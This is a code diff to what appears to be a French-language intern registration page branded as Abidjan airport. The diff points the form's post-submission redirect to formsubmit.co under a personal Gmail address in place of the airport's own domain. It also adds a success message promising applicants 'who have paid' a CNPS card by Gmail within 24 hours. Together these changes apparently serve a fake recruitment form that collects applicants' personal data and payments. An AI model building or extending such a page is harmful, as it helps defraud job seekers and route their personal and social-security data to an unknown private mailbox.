@@ -437,7 +437,7 @@
                     <input type="hidden" name="_subject" value="Nouvelle inscription stagiaire - Aéroport Abidjan">
                     <input type="hidden" name="_template" value="table">
                     <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_next" value="https://aeroport-abidjan.ci/merci.html">
+                    <input type="hidden" name="_next" value="https://formsubmit.co/agenceboolky6@gmail.com?success=true">
                     
                     <!-- Champs cachés pour redirection après succès (optionnel) -->
                     <!-- <input type="hidden" name="_next" value="https://votre-site.com/confirmation.html"> -->
@@ -755,6 +755,25 @@ if (cnpsNumero) {
             this.classList.remove('input-error');
         }
     });
+}
+
+// Ajoutez ceci à la fin de votre script, après l'initialisation
+
+// Vérifier si le formulaire a été soumis avec succès (paramètre dans l'URL)
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.get('success') === 'true') {
+    // Cacher le formulaire
+    document.getElementById('congratsBlock').style.display = 'none';
+    document.getElementById('formContainer').classList.add('hidden');
+    
+    // Afficher un message de succès
+    const recap = document.getElementById('recapMessage');
+    recap.innerHTML = `<div class="success-message">
+        <i class="fas fa-check-circle fa-3x"></i>
+        <h2>Inscription confirmée !</h2>
+        <p>Votre inscription a bien été enregistrée.<br>
+        <strong>Pour ceux qui ont effectué le paiement :</strong> votre carte CNPS vous sera envoyée par Gmail sous 24h.</p>
+    </div>`;
 }
     </script>
 </body>
